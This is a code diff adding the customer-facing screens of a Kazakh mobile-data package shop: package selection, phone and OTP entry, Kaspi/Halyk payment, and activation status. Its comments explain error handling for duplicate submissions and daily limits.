+  <div class="txt" style="flex:1"><strong>${esc(t('need_help'))}</strong><span>${esc(t('need_help_desc'))}</span></div>
+  <div style="display:flex;gap:8px;flex:none">
+   <a class="support-btn" style="text-decoration:none;display:inline-flex;align-items:center" href="https://wa.me/77775949300" target="_blank" rel="noopener">${esc(t('open_wa'))}</a>
+  </div>
+ </div>`;
+}
+// Live-run UX fix (2026-09-04): a DAILY_PHONE_LIMIT rejection is a business rule, not a typo in the
+// number - the original one-line .error-banner (designed for a short "attempts left: N" line) read as
+// just another red-border validation blip and the owner reported the Continue button "doesn't work" on
+// their two already-exhausted test numbers. This is deliberately its own bigger, unmissable block
+// (own icon circle, bold title, plain-language deadline) and callers scroll it into view - the same
+// kind of block the OTP/phone screens already use for their real terminal states.
+function dailyLimitBanner(){ return `<div class="card center daily-limit-banner" id="dailyLimitBanner"><div class="icon-circle err">⏳</div><h2 class="title" style="font-size:17px">${esc(t('daily_limit_title'))}</h2><p class="desc">${esc(t('daily_limit_desc'))}</p></div>`; }
+// Parallel orders on different numbers (2026-09-06): same banner shape as dailyLimitBanner - this is a
+// business rule about the NUMBER just entered, not a typo, so it gets the same unmissable treatment
+// rather than a red-border cue.
+function phoneInProgressBanner(){ return `<div class="card center daily-limit-banner" id="dailyLimitBanner"><div class="icon-circle err">⏳</div><h2 class="title" style="font-size:17px">${esc(t('phone_in_progress_title'))}</h2><p class="desc">${esc(t('phone_in_progress_desc'))}</p></div>`; }
+function trustBlock(){
+ return `<div class="trust"><div>🛡️<span>${esc(t('trust1'))}</span></div><div>⚡<span>${esc(t('trust2'))}</span></div><div>👍<span>${esc(t('trust3'))}</span></div></div>`;
+}
+function footBlock(){ return `<p class="foot">© 2026 GEO MASTER</p>`; }
+function bindSupport(){
+ const btn = document.getElementById('supportBtn');
+ if(!btn) return;
+ btn.addEventListener('click', async ()=>{
+  btn.disabled = true; btn.textContent = '…';
+  try{ await api('/support', {}); btn.textContent = t('support_sent'); }
+  catch(e){ btn.disabled = false; btn.textContent = t('open_wa'); }
+ });
+}
+
+function renderPackages(el){
+ const pkgs = (ctx.availablePackages||[]).filter(p=>['7GB','20GB'].includes(p.id));
+ const rows = pkgs.map(p=>{
+  const isStd = p.id==='20GB';
+  return `<button class="pkg ${isStd?'std':'lite'}" data-id="${esc(p.id)}">
+   <div class="icon">${isStd?'⭐':'🚀'}</div>
+   <div class="info"><div class="name">${isStd?t('std'):t('lite')}</div><div class="gb">${p.trafficGb} ГБ · ${t('per_month')}</div></div>
+   <div class="price">${money(p.price)} ₸</div>
+  </button>`;
+ }).join('');
+ el.innerHTML = `
+  <p class="subtitle">${esc(t('choose_title'))}</p>
+  <div id="pkgNotice"></div>
+  <div>${rows}</div>
+  <div class="benefits">
+   <h3>${esc(t('benefits_title'))}</h3>
+   <ul>${t('b_all').map(b=>`<li><span class="e">•</span>${esc(b)}</li>`).join('')}</ul>
+  </div>
+  ${trustBlock()}
+  ${footBlock()}
+ `;
+ el.querySelectorAll('.pkg').forEach(btn=>btn.addEventListener('click', async ()=>{
+  document.getElementById('pkgNotice').innerHTML = '';
+  el.querySelectorAll('.pkg').forEach(b=>b.disabled=true);
+  try{ ctx = await api('/package', {packageId: btn.dataset.id}); render(); }
+  catch(e){
+   el.querySelectorAll('.pkg').forEach(b=>b.disabled=false);
+   // A package can be picked from the "waiting ~5 minutes" screen too (2026-09-04), but the backend
+   // still correctly refuses a second order while the current one is TRAINING/PROVISIONING - explain
+   // that plainly instead of leaving the buttons silently reset with no feedback.
+   if(e.code==='INVALID_STATE_TRANSITION') document.getElementById('pkgNotice').innerHTML =
+    `<div class="error-banner" style="margin-bottom:14px">⏳ <strong>${esc(t('order_in_progress'))}</strong><br>${esc(t('order_in_progress_desc'))}</div>`;
+  }
+ }));
+}
+
+function renderPhone(el){
+ const pkg = ctx.selectedPackage;
+ // Nothing has been submitted to the backend yet at this point (submitPhone only fires on Continue),
+ // so going back to packages is pure client-side navigation - no API call needed.
+ setBack(true, ()=>{ showScreen('packages'); });
+ el.innerHTML = `
+  <div class="card">
+   <p class="subtitle" style="margin-bottom:16px">${esc(t('phone_title'))}</p>
+   ${pkg ? `<div class="pkg ${pkg.id==='20GB'?'std':'lite'}" style="cursor:default;margin-bottom:18px">
+     <div class="icon">${pkg.id==='20GB'?'⭐':'🚀'}</div>
+     <div class="info"><div class="name">${pkg.id==='20GB'?t('std'):t('lite')}</div><div class="gb">${pkg.trafficGb} ГБ</div></div>
+     <div class="price">${money(pkg.price)} ₸<div style="font-size:10px;font-weight:600;color:var(--ink-dim);margin-top:2px">${t('validity')}: ${t('days30')}</div></div>
+   </div>` : ''}
+   <label>${esc(t('phone_label'))}</label>
+   <p style="color:var(--ink-dim);font:500 12.5px var(--body);margin-bottom:10px">${esc(t('phone_hint'))}</p>
+   <div class="phoneinput"><span>+7-</span><input id="phoneInput" inputmode="numeric" maxlength="20" placeholder="XXX-XXX-XX-XX" autocomplete="tel"></div>
+   <div class="hint">🛡️ ${esc(t('phone_secure'))}</div>
+  </div>
+  <div id="phoneNotice"></div>
+  <div class="info-box">
+   <div class="ico">i</div>
+   <div><strong style="display:block;margin-bottom:6px">${esc(t('whatnext'))}</strong>
+    1. ${esc(t('step1'))}<br>2. ${esc(t('step2'))}<br>3. ${esc(t('step3'))}<br>4. ${esc(t('step4'))}
+   </div>
+  </div>
+  <button class="btn btn-primary" id="phoneContinue">${esc(t('continue'))} →</button>
+  ${footBlock()}
+ `;
+ const input = document.getElementById('phoneInput');
+ bindPhoneMask(input);
+ document.getElementById('phoneContinue').addEventListener('click', async ()=>{
+  const digits = input.value.replace(/\D/g,'');
+  if(digits.length<10){ input.style.borderColor='var(--danger)'; return; }
+  document.getElementById('phoneNotice').innerHTML = '';
+  const btn = document.getElementById('phoneContinue'); btn.disabled = true;
+  const originalLabel = btn.textContent; btn.textContent = t('otp_checking');
+  try{ ctx = await api('/phone', {phone: '7'+digits}); if(ctx.orderId) rememberWatchedOrder(ctx.orderId); render(); }
+  catch(e){
+   btn.disabled=false; btn.textContent = originalLabel;
+   // Same class of bug as the OTP screen's fix (2026-09-04): PHONE_NOT_EXPECTED means an earlier
+   // submission of THIS SAME number already succeeded (a duplicate click, or a resubmit after the
+   // screen looked stuck) - the phone was never actually invalid, showing a red border here would be
+   // exactly as misleading as the OTP screen's old "code incorrect" was. Refresh and move on instead.
+   if(e.code==='PHONE_NOT_EXPECTED'){ await refreshContext().catch(()=>{}); render(); return; }
+   // DAILY_PHONE_LIMIT isn't a bad number - reddening the field would wrongly suggest a typo, so it
+   // gets the big unmissable banner instead, scrolled into view (the button can be off-screen on a
+   // small phone). Every other rejection keeps the plain red-border cue as before.
+   if(e.code==='DAILY_PHONE_LIMIT'){
+    document.getElementById('phoneNotice').innerHTML = dailyLimitBanner();
+    document.getElementById('dailyLimitBanner').scrollIntoView({behavior:'smooth',block:'center'});
+   }else if(e.code==='PHONE_ALREADY_IN_PROGRESS'){
+    document.getElementById('phoneNotice').innerHTML = phoneInProgressBanner();
+    document.getElementById('dailyLimitBanner').scrollIntoView({behavior:'smooth',block:'center'});
+   }else{
+    input.style.borderColor='var(--danger)';
+   }
+  }
+ });
+}
+
+function renderReceipt(el){
+ const pkg = ctx.selectedPackage;
+ // The order created on the phone screen is still unpaid at this point - back cancels it server-side
+ // (goBackToPhone) and returns to phone entry for the same package, so a resubmitted phone number
+ // starts a genuinely fresh order rather than colliding with the abandoned one. If a payment happens to
+ // land in the same instant (rare race), the backend refuses the cancel - refresh and show whatever
+ // the real state now is instead of leaving the screen stuck.
+ setBack(true, async ()=>{
+  const backBtn = document.getElementById('backBtn'); backBtn.disabled = true;
+  try{ ctx = await api('/back-to-phone', {}); }
+  catch(e){ await refreshContext().catch(()=>{}); }
+  backBtn.disabled = false;
+  render();
+ });
+ el.innerHTML = `
+  <div class="card">
+   <p class="subtitle" style="margin-bottom:16px">${esc(t('receipt_title'))}</p>
+   <div class="receipt">
+    <div class="receipt-row"><span class="k">${esc(t('pkg'))}</span><span class="v">${pkg?pkg.trafficGb:''} ГБ</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('to_pay'))}</span><span class="v">${pkg?money(pkg.price):''} ₸</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v">+${esc(ctx.client.phone||'')}</span></div>
+   </div>
+   <label style="margin-top:4px">${esc(t('method'))}</label>
+   <div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">
+    <button class="btn btn-kaspi" data-method="KASPI">${esc(t('kaspi'))} <span style="font-weight:500;font-size:12px;opacity:.85">· ${esc(t('no_fee'))}</span></button>
+    <button class="btn btn-halyk" data-method="HALYK">${esc(t('halyk'))} <span style="font-weight:500;font-size:12px;opacity:.85">· ${esc(t('no_fee'))}</span></button>
+   </div>
+  </div>
+  ${footBlock()}
+ `;
+ el.querySelectorAll('[data-method]').forEach(btn=>btn.addEventListener('click', async ()=>{
+  el.querySelectorAll('[data-method]').forEach(b=>b.disabled=true);
+  try{
+   const res = await api('/payment-method', {method: btn.dataset.method});
+   selectedMethod = res.method;
+   if(res.paymentUrl) window.open(res.paymentUrl, '_blank');
+   showScreen('checking');
+  }catch(e){
+   // Same class of bug as the phone/OTP screens (2026-09-04): PAYMENT_METHOD_NOT_EXPECTED means an
+   // earlier click already succeeded and moved past this screen - re-enabling these buttons would
+   // just leave the customer stuck retrying a step that's already done. Refresh and move on instead.
+   if(e.code==='PAYMENT_METHOD_NOT_EXPECTED'){ await refreshContext().catch(()=>{}); render(); return; }
+   el.querySelectorAll('[data-method]').forEach(b=>b.disabled=false);
+  }
+ }));
+}
+
+function renderChecking(el){
+ const pkg = ctx.selectedPackage;
+ el.innerHTML = `
+  <div class="card center">
+   <div class="spinner"></div>
+   <h2 class="title">${esc(t('checking_title'))}</h2>
+   <p class="desc" style="margin-bottom:18px">${esc(t('checking_desc'))}</p>
+   <div class="receipt">
+    <div class="receipt-row"><span class="k">${esc(t('pkg'))}</span><span class="v">${pkg?pkg.trafficGb:''} ГБ</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('to_pay'))}</span><span class="v">${pkg?money(pkg.price):''} ₸</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v">+${esc(ctx.client.phone||'')}</span></div>
+   </div>
+  </div>
+  ${supportBlock()}
+  ${footBlock()}
+ `;
+ bindSupport();
+}
+
+function renderActivating(el){
+ // Parallel orders on different numbers (2026-09-07): ctx.selectedPackage/ctx.client.phone describe
+ // only the CLIENT's current interactive step - the client is freed (and these cleared) as soon as
+ // THIS order's training starts, so by the time this screen is showing they're usually already null
+ // (or, worse, could belong to a DIFFERENT order the client has since started). Resolve the watched
+ // order's own package/phone from ctx.orders instead; fall back to the old fields only if that entry
+ // isn't there yet (e.g. the very first render right after OTP, before the next poll lands).
+ const mine = watchedOrderId();
+ const mineEntry = mine && Array.isArray(ctx.orders) ? ctx.orders.find(o => o.orderId === mine) : null;
+ const pkg = mineEntry ? (ctx.availablePackages||[]).find(p => p.id === mineEntry.packageId) : ctx.selectedPackage;
+ const phone = mineEntry ? mineEntry.targetPhone : ctx.client.phone;
+ el.innerHTML = `
+  <div class="card center">
+   <div class="icon-circle ok">🎁</div>
+   <h2 class="title">${esc(t('activating_title'))}</h2>
+   <p class="desc">${esc(t('activating_desc'))}</p>
+   <div class="receipt" style="margin-top:16px">
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v">+${esc(phone||'')}</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('pkg'))}</span><span class="v">${pkg?pkg.trafficGb:''} ГБ</span></div>
+   </div>
+  </div>
+  <div class="card center">
+   <h2 class="title" style="font-size:18px">${esc(t('buy_again_title'))}</h2>
+   <p class="desc" style="margin-bottom:16px">${esc(t('buy_again_desc'))}</p>
+   <button class="btn btn-primary" id="buyAgainBtn">${esc(t('buy_again_btn'))} →</button>
+  </div>
+  ${supportBlock()}
+  ${footBlock()}
+ `;
+ bindSupport();
+ // A package selected here is only fully confirmed once THIS order reaches ACTIVE - selectPackage
+ // correctly rejects it (INVALID_STATE_TRANSITION) while still TRAINING/PROVISIONING; browsing/picking
+ // is still made available from this screen (2026-09-04 request), the friendly explanation lives in
+ // renderPackages's own catch handler right next to that call.
+ document.getElementById('buyAgainBtn').addEventListener('click', ()=>{ showScreen('packages'); });
+}
+
+let otpBoxes = [];
+function renderOtp(el, wrong){
+ const phone = ctx.client.phone||'';
+ el.innerHTML = `
+  <div class="card center">
+   <div class="icon-circle ${wrong?'err':'ok'}">${wrong?'✕':'✈️'}</div>
+   <h2 class="title">${wrong?esc(t('wrong_code')):esc(t('otp_title'))}</h2>
+   <p class="desc">${esc(t('otp_desc'))}</p>
+   <div class="receipt" style="margin-top:14px">
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v" style="display:flex;align-items:center;gap:8px">+${esc(phone)}<button id="changeNumberLink" style="background:none;border:none;padding:0;font:700 12px var(--body);color:var(--blue);text-decoration:underline;cursor:pointer">${esc(t('change_number_link'))}</button></span></div>
+   </div>
+   ${wrong?`<div class="error-banner" style="margin-top:14px">⚠️ ${esc(t('wrong_desc'))} ${esc(t('attempts_left'))} ${pendingOtpAttempts}</div>`
+          :`<div class="info-box" style="margin-top:14px;text-align:left"><div class="ico">✓</div><div>${esc(t('otp_valid'))} ${esc(t('otp_secret'))}</div></div>`}
+   <label style="text-align:left;margin-top:18px">${esc(t('enter_code'))}</label>
+   <div class="otp" id="otpBoxes">${Array.from({length:6}).map((_,i)=>`<input maxlength="1" inputmode="numeric" data-i="${i}">`).join('')}</div>
+   <button class="btn btn-primary" id="otpConfirm" disabled>${esc(t('confirm'))} →</button>
+   <div class="timer" id="resendWrap">${wrong ? `<button class="resend" id="resendBtn">${esc(t('resend'))}</button>` : `<span id="resendCountdown">⏱ ${esc(t('resend_in'))} 01:00</span>`}</div>
+   <div id="changeNumberForm" hidden style="text-align:left;margin-top:14px;padding-top:14px;border-top:1px solid var(--line)">
+    <label>${esc(t('change_number_title'))}</label>
+    <p style="color:var(--ink-dim);font:500 12.5px var(--body);margin-bottom:10px">${esc(t('change_number_desc'))}</p>
+    <div class="phoneinput"><span>+7-</span><input id="newPhoneInput" inputmode="numeric" maxlength="20" placeholder="XXX-XXX-XX-XX" autocomplete="tel"></div>
+    <div id="changeNumberNotice"></div>
+    <div style="display:flex;gap:10px;margin-top:12px">
+     <button class="btn" id="changeNumberCancel" style="background:var(--line);color:var(--ink)">${esc(t('change_number_cancel'))}</button>
+     <button class="btn btn-primary" id="changeNumberSubmit">${esc(t('change_number_btn'))}</button>
+    </div>
+   </div>
+  </div>
+  ${supportBlock()}
+  ${footBlock()}
+ `;
+ bindSupport();
+ // Live-run UX fix (2026-09-04): the entered number and its "change" action now sit right on the
+ // receipt row (visible in BOTH the normal and wrong-code renders - it used to disappear on a wrong
+ // attempt, and the change link itself lived in a separate block below the resend timer entirely).
+ document.getElementById('changeNumberLink').addEventListener('click', ()=>{
+  document.getElementById('changeNumberForm').hidden = false;
+  document.getElementById('newPhoneInput').focus();
+ });
+ document.getElementById('changeNumberCancel').addEventListener('click', ()=>{
+  document.getElementById('changeNumberForm').hidden = true;
+ });
+ const newPhoneInput = document.getElementById('newPhoneInput');
+ bindPhoneMask(newPhoneInput);
+ document.getElementById('changeNumberSubmit').addEventListener('click', async ()=>{
+  const digits = newPhoneInput.value.replace(/\D/g,'');
+  if(digits.length<10){ newPhoneInput.style.borderColor='var(--danger)'; return; }
+  document.getElementById('changeNumberNotice').innerHTML = '';
+  const submitBtn = document.getElementById('changeNumberSubmit'); submitBtn.disabled = true;
+  try{
+   ctx = await api('/change-phone', {phone: '7'+digits});
+   pendingOtpAttempts = 3;
+   render();
+  }catch(e){
+   submitBtn.disabled=false;
+   if(e.code==='PHONE_CORRECTION_NOT_EXPECTED'){ await refreshContext().catch(()=>{}); render(); return; }
+   if(e.code==='DAILY_PHONE_LIMIT'){
+    document.getElementById('changeNumberNotice').innerHTML = dailyLimitBanner();
+    document.getElementById('dailyLimitBanner').scrollIntoView({behavior:'smooth',block:'center'});
+   }else{
+    newPhoneInput.style.borderColor='var(--danger)';
+   }
+  }
+ });
+ otpBoxes = Array.from(el.querySelectorAll('#otpBoxes input'));
+ const confirmBtn = document.getElementById('otpConfirm');
+ function currentCode(){ return otpBoxes.map(b=>b.value).join(''); }
+ function updateState(){
+  const code = currentCode();
+  confirmBtn.disabled = code.length!==6;
+  otpBoxes.forEach(b=>b.classList.toggle('filled', !!b.value));
+ }
+ otpBoxes.forEach((box,i)=>{
+  box.addEventListener('input', ()=>{
+   box.value = box.value.replace(/\D/g,'');
+   if(box.value && otpBoxes[i+1]) otpBoxes[i+1].focus();
+   updateState();
+  });
+  box.addEventListener('keydown', e=>{
+   if(e.key==='Backspace' && !box.value && otpBoxes[i-1]) otpBoxes[i-1].focus();
+  });
+  box.addEventListener('paste', e=>{
+   const text = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+   if(text.length===6){ e.preventDefault(); otpBoxes.forEach((b,j)=>b.value=text[j]||''); updateState(); otpBoxes[5].focus(); }
+  });
+ });
+ confirmBtn.addEventListener('click', async ()=>{
+  confirmBtn.disabled = true;
+  // Live-run fix (2026-09-04): the real Beeline OTP check can take a few seconds - with no feedback
+  // the button just looked stuck, which is exactly what led to a submit-again-while-waiting duplicate.
+  confirmBtn.textContent = t('otp_checking');
+  try{
+   ctx = await api('/otp', {code: currentCode()});
+   pendingOtpAttempts = 3;
+   render();
+  }catch(e){
+   // OTP_NOT_EXPECTED means the job already moved past WAITING_OTP - almost always because an
+   // earlier submission (the slow real check above, or a duplicate click/resubmit while waiting)
+   // already succeeded. Showing "code incorrect" here would be flatly wrong - confirmed live: the
+   // code was entered correctly, training actually started, and the site still said it didn't match.
+   // Refresh and show whatever the real state now is instead of guessing it was a bad code.
+   if(e.code==='OTP_NOT_EXPECTED'){ await refreshContext().catch(()=>{}); render(); return; }
+   pendingOtpAttempts = Math.max(0, pendingOtpAttempts-1);
+   otpBoxes.forEach(b=>b.classList.add('bad'));
+   renderOtp(el, true);
+   // 2026-09-04: the backend itself already sends a fresh code and resets attempts once the 3rd wrong
+   // one lands (server-side WRONG_ATTEMPTS_EXHAUSTED handling) - calling /otp-resend here too used to
+   // be dead code (this catch never used to fire for a real wrong code, see the OTP_REJECTED fix on the
+   // backend), so fixing that would have started sending the customer a duplicate code. Just mirror the
+   // reset locally.
+   if(pendingOtpAttempts<=0){ pendingOtpAttempts = 3; }
+  }
+ });
+ // Owner request (2026-09-06): clicking "запросить новый код" gave no visible confirmation beyond a
+ // tiny "✓" replacing the button text (easy to miss next to the wrong-code error banner above it), and
+ // the button then stayed disabled forever - no cooldown, no way to ever ask again. Now it shows an
+ // explicit "code sent" message and re-arms itself after a real 30s cooldown, same countdown pattern
+ // already used for the first automatic send below.
+ function startResendCooldown(el, secs, justSent){
+  el.innerHTML = `<span id="resendCountdown">⏱ ${esc(t('resend_in'))} 00:${String(secs).padStart(2,'0')}</span>` + (justSent ? `<div id="resendSentNotice" style="color:var(--blue);font:700 12.5px var(--body);margin-top:8px">${esc(t('resend_sent'))}</div>` : '');
+  const cd = document.getElementById('resendCountdown');
+  const timer = setInterval(()=>{
+   secs--;
+   if(secs<=0){
+    clearInterval(timer);
+    el.innerHTML = `<button class="resend" id="resendBtn">${esc(t('resend'))}</button>`;
+    bindResendBtn(document.getElementById('resendBtn'));
+    return;
+   }
+   const m = String(Math.floor(secs/60)).padStart(2,'0'), s = String(secs%60).padStart(2,'0');
+   cd.textContent = `⏱ ${t('resend_in')} ${m}:${s}`;
+  }, 1000);
+ }
+ function bindResendBtn(btn){
+  btn.addEventListener('click', async (ev)=>{
+   ev.target.disabled = true;
+   try{ await api('/otp-resend', {}); startResendCooldown(document.getElementById('resendWrap'), 30, true); }
+   catch(e){ ev.target.disabled=false; }
+  });
+ }
+ // Live-run UX fix (2026-09-04): a wrong code no longer makes the customer wait out the full 60s
+ // countdown before they can ask for a new one - the resend button (already in the markup above for
+ // the wrong-code render) is live immediately. The countdown only ever runs on the FIRST, not-yet-
+ // wrong render, exactly as before.
+ if(wrong){
+  bindResendBtn(document.getElementById('resendBtn'));
+ }else{
+  startResendCooldown(document.getElementById('resendWrap'), 60, false);
+ }
+}
+
+function renderSuccess(el){
+ const completedPkgId = ctx.lastCompletedOrder && ctx.lastCompletedOrder.packageId;
+ const pkg = ctx.selectedPackage || (ctx.availablePackages||[]).find(p=>p.id===completedPkgId) || null;
+ const gb = pkg ? (pkg.trafficGb || '') : '';
+ // Parallel orders on different numbers (2026-09-07): ctx.client.phone is the client's single, most
+ // recently entered phone number - once a second order has been started (even just phone entry, not
+ // yet paid), it no longer reflects THIS (just-completed) order's own number. lastCompletedOrder is a
+ // real order row and already carries its own targetPhone - use that instead, falling back to
+ // ctx.client.phone only if it's somehow missing.
+ const phone = (ctx.lastCompletedOrder && ctx.lastCompletedOrder.targetPhone) || ctx.client.phone;
+ el.innerHTML = `
+  <div class="card center">
+   <div class="icon-circle ok">✓</div>
+   <h2 class="title">${esc(t('success_title'))}</h2>
+   <p class="desc">${esc(t('success_sub'))}</p>
+   <div class="receipt" style="margin-top:16px">
+    <div class="receipt-row"><span class="k">${esc(t('number'))}</span><span class="v">+${esc(phone||'')}</span></div>
+    <div class="receipt-row"><span class="k">${esc(t('pkg'))}</span><span class="v">${gb} ГБ</span></div>
+   </div>
+   <div class="info-box" style="margin-top:14px;text-align:left">
+    <div class="ico">🎁</div>
+    <div><strong style="display:block">${gb} ${esc(t('gifting'))}</strong>${esc(t('started'))}</div>
+   </div>
+   <p class="desc" style="margin-top:14px">${esc(t('sms'))}</p>
+  </div>
+  <div class="card center">
+   <h2 class="title" style="font-size:18px">${esc(t('buy_again_title'))}</h2>
+   <p class="desc" style="margin-bottom:16px">${esc(t('buy_again_desc'))}</p>
+   <button class="btn btn-primary" id="buyAgainBtn">${esc(t('buy_again_btn'))} →</button>
+  </div>
+  ${supportBlock()}
+  ${trustBlock()}
+  ${footBlock()}
+ `;
+ bindSupport();
+ // "Buy another package" (2026-09-04): the account is already ACTIVE/free-to-act on the backend -
+ // selecting a new package from here is the exact same repeat-purchase path selectPackage always
+ // supported (see order-c2-repeat-purchase.test.js). Client-side we just need to stop treating this
+ // page load as "just finished" so render() shows packages instead of bouncing back to this screen.
+ document.getElementById('buyAgainBtn').addEventListener('click', ()=>{ engagedThisSession = false; showScreen('packages'); });
+}
+
+function renderFailed(el){
+ el.innerHTML = tplMessage(t('fail_title'), t('fail_desc'), 'err', '📵') + supportBlock() + footBlock();
+ bindSupport();
+ api('/support', {}).catch(()=>{});
+}
+
+applyLang();
+initSession();
+</script>
+</body>
+</html>
